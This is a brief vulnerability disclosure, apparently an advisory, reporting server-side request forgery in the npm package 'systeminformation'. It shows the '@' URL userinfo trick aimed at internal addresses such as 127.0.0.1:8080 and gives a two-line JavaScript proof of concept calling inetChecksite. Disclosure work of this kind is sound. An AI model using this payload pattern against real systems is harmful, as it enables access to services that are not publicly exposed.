# Description

`systeminformation` package is vulnerable to `Server-side request forgery`. It allows attackers to abuse of `@` to make requests to a different domain or possibility to applications that are not publicly exposed through `http://effectrenan.com@127.0.0.1:8080`.

# Proof of Concept

```javascript
const si = require('systeminformation');
si.inetChecksite("https://effectrenan.com@google.com").then(a => { console.log(a) });
```
